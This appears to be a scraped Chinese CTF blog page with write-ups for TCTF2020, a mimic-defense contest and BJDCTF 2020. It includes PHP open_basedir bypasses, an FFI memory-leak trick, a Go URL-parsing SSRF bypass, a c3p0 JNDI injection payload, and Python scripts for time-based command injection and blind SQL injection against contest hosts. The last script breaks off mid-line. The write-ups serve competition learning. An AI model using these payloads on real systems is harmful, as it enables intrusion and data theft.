<p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;</span><br></pre></td></tr></table></figure>

<p>列目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure>

<p>看到flag.h+flag.so+ffi猜测是要用ffi来加载flag.h然后执行其中的方法，</p>
<p>测试后发现 ffi::load 无视open_basedir ,但是只能加载 /flag.h</p>
<p>当我们又不知道flag.h中的函数定义。。。。。。</p>
<p>后来这题是因为别人把题目打穿了，全场绕过open_basedir，读取了flag</p>
<h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>这题听说是因为出题人因为easyphp重出的题目</p>
<p>这里就要直面刚刚明明无法读取flag.h又要了解flag.h中的函数声明</p>
<p>因为这里有ffi，可以直接操作系统的底层，我们试试内存泄露</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=FFI::load(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=FFI::cast(<span class="string">&quot;void *&quot;</span>,FFI::new(<span class="string">&quot;int[1]&quot;</span>,<span class="literal">false</span>));</span><br><span class="line"><span class="variable">$a</span>=FFI::string(<span class="variable">$b</span>-<span class="number">400000</span>,<span class="number">400000</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p>
<p>好玩.jpg</p>
<h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> mkdir(<span class="string">&#x27;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#x27;</span>);chdir(<span class="string">&#x27;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/06/29/tctf2020/" data-id="cku8ky2z90066dnnfcb7i3rf1" data-title="tctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-拟态防御记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/22/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-06-22T16:00:00.000Z" itemprop="datePublished">2020-06-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/22/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	secret   = <span class="string">&quot;xiaomo.wabzsy&quot;</span></span><br><span class="line">	banner   = <span class="string">&quot;Golang HTTP Server (v2.3.3)&quot;</span></span><br><span class="line">	template = <span class="string">`&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;San Check&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">			&lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;</span></span><br><span class="line"><span class="string">			&lt;input type=&quot;submit&quot; value=&quot;淦!&quot; /&gt;</span></span><br><span class="line"><span class="string">		&lt;/form&gt;</span></span><br><span class="line"><span class="string">		&lt;pre&gt;</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">		&lt;/pre&gt;</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">	&lt;!-- ./sancheck.php --&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SanCheck</span><span class="params">(input <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	u, err := url.Parse(input)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Scheme != <span class="string">&quot;http&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Scheme [%s]&quot;</span>, u.Scheme)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Opaque != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;</span>, u.Opaque)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Hostname() != <span class="string">&quot;127.0.0.1&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Hostname [%s]&quot;</span>, u.Hostname())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Port() != <span class="string">&quot;&quot;</span> &amp;&amp; u.Port() != <span class="string">&quot;80&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Port [%s]&quot;</span>, u.Port())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.User == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Authorization Required&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.User.Username() != <span class="string">&quot;root&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Username [%s]&quot;</span>, u.User.Username())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> password, set := u.User.Password(); !set || password != <span class="string">&quot;P@ssw0rd!&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Password [%s]&quot;</span>, password)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.RequestURI() != <span class="string">&quot;/flag.php&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid RequestURI [%s]&quot;</span>, u.RequestURI())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> u.Fragment != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: Invalid Fragment [%s]&quot;</span>, u.Fragment)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !strings.Contains(u.String(), <span class="string">&quot;&#x27;Pwned!&#x27;&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;err: San Check failed&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DefaultHandler</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	input := req.PostFormValue(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> input == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		Response(w, template, <span class="string">&quot;Where is the flag?&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := SanCheck(input); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		req, _ := http.NewRequest(<span class="string">&quot;GET&quot;</span>, input, <span class="literal">nil</span>)</span><br><span class="line">		req.Header.Add(<span class="string">&quot;Secret&quot;</span>, secret)</span><br><span class="line">		<span class="keyword">if</span> resp, err := (&amp;http.Client&#123;&#125;).Do(req); err == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> body, err := ioutil.ReadAll(resp.Body); err == <span class="literal">nil</span> &#123;</span><br><span class="line">				Response(w, template, <span class="keyword">string</span>(body))</span><br><span class="line">			&#125;</span><br><span class="line">			_ = resp.Body.Close()</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			Response(w, template, err.Error())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		Response(w, template, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FlagHandler</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> strings.Join(req.Header[<span class="string">&quot;Secret&quot;</span>], <span class="string">&quot;&quot;</span>) != secret &#123;</span><br><span class="line">		Forbidden(w)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> !strings.HasPrefix(req.RemoteAddr, <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">		Forbidden(w)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		Response(w, <span class="string">&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;</span>, readFlag())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readFlag</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> bs, err := ioutil.ReadFile(<span class="string">&quot;./flag.txt&quot;</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">string</span>(bs)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;</span>, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CodeHandler</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain; charset=utf-8&quot;</span>)</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Server&quot;</span>, banner)</span><br><span class="line">	<span class="keyword">if</span> bs, err := ioutil.ReadFile(<span class="string">&quot;main.go&quot;</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		_, _ = w.Write(bs)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		_, _ = w.Write(</span><br><span class="line">			[]<span class="keyword">byte</span>(</span><br><span class="line">				fmt.Sprintf(<span class="string">&quot;Unable to read main.go, please contact technical support.(%s)&quot;</span>,</span><br><span class="line">					err.Error(),</span><br><span class="line">				),</span><br><span class="line">			),</span><br><span class="line">		)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Forbidden</span><span class="params">(w http.ResponseWriter)</span></span> &#123;</span><br><span class="line">	w.WriteHeader(<span class="number">403</span>)</span><br><span class="line">	Response(w, <span class="string">&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;</span>, <span class="string">&quot;403 Forbidden&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Response</span><span class="params">(w http.ResponseWriter, tpl <span class="keyword">string</span>, response <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>)</span><br><span class="line">	w.Header().Set(<span class="string">&quot;Server&quot;</span>, banner)</span><br><span class="line">	<span class="keyword">if</span> _, err := fmt.Fprintf(w, tpl, response); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, DefaultHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/flag.php&quot;</span>, FlagHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/sancheck.php&quot;</span>, CodeHandler)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据issue<a target="_blank" rel="noopener" href="https://github.com/golang/go/issues/29098">https://github.com/golang/go/issues/29098</a> 绕过</p>
<p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:&#99;&#99;&#114;&#x65;&#97;&#x74;&#x65;&#114;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#109;">&#99;&#99;&#114;&#x65;&#97;&#x74;&#x65;&#114;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#109;</a>  E6N0HT aa05940594</p>
<p>cmd={“/expandocolumn/add-column”:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={“jndiName”:”ldap://127.0.0.1:1389/Object”,”loginTimeout”:0}</p>
<h2 id="白盒拟态路由"><a href="#白盒拟态路由" class="headerlink" title="白盒拟态路由"></a>白盒拟态路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vtysh</span><br><span class="line">conf t</span><br><span class="line">ip route 200.14.1.0/24 x.x.x.x</span><br></pre></td></tr></table></figure>

<h2 id="白盒拟态域名服务器"><a href="#白盒拟态域名服务器" class="headerlink" title="白盒拟态域名服务器"></a>白盒拟态域名服务器</h2><p>上传busybox 来使用nslookup等命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/name.conf</span><br><span class="line">根据配置修改</span><br><span class="line">sudo /usr/local/bind-9.11.19/bin/named/named</span><br><span class="line">busybox nslookup www.test.com 172.29.126.2 看结果</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/06/22/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="cku8ky2zs007ndnnfduzv35o7" data-title="拟态防御记录" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020第三届BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/23/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" class="article-date">
  <time class="dt-published" datetime="2020-05-23T16:00:00.000Z" itemprop="datePublished">2020-05-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/23/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020BJDCTF第三届"><a href="#2020BJDCTF第三届" class="headerlink" title="2020BJDCTF第三届"></a>2020BJDCTF第三届</h1><h2 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">flag_format = re.compile(<span class="string">&#x27;flag\\&#123;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;\\&#125;&#x27;</span>)</span><br><span class="line">all_letter = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()&#125;&#123;_&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_flag(command):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(<span class="string">&#x27;http://183.129.189.60:10071&#x27;</span>, params=&#123;<span class="string">&#x27;imagin&#x27;</span>: command&#125;, timeout=<span class="number">9</span>)</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;BJD&#123;make_iptables_great_again&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> flag_format.<span class="keyword">match</span>(flag) == None:</span><br><span class="line">        staus = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i in all_letter:</span><br><span class="line">            payload = <span class="string">&#x27;cat /flag|grep %s &amp;&amp;sleep 10&#x27;</span> % (flag + i)</span><br><span class="line">            <span class="keyword">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> get_flag(payload):</span><br><span class="line">                staus = <span class="number">1</span></span><br><span class="line">                flag += i</span><br><span class="line">                <span class="keyword">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> staus == <span class="number">0</span>:</span><br><span class="line">            flag = flag[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20200523090430266.png" alt="image968"></p>
<p>可能存在反序列化</p>
<p>和文件内容无关</p>
<p>上传文件后发现有个filename字段，show界面是直接出现图片的base64编码，如果我们能控制filename字段就有可能任意读取</p>
<p>当唯一麻烦的是，文件名后面有个md5校验值</p>
<p>但是当我们直接上传的时候她会生成一个，哪怕没上传成功</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p>
<p>直接拿来用访问show.php就拿到flag了</p>
<h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p>
<p><a target="_blank" rel="noopener" href="http://183.129.189.60:10112/?by=desc">http://183.129.189.60:10112/?by=desc</a></p>
<p>黑名单:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p>
<p>给了个hint:<code>table</code>,不知道啥意思</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlinj</span>(<span class="params">num</span>):</span></span><br><span class="line"></span><br><span class="line">    burp0_url = <span class="string">&quot;http://183.129.189.60:10117/&quot;</span></span><br><span class="line">    param=&#123;<span class="string">&quot;by&quot;</span>:<span class="string">&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),&#123;POS&#125;),2),16,10)  )-&#123;GUESS&#125;) then 1 ELSE user() end))&quot;</span>.<span class="built_in">format</span>(POS=pos,GUESS=num)&#125;</span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;</span>, <span class="string">&quot;_xsrf&quot;</span>: <span class="string">&quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;</span>&#125;</span><br><span 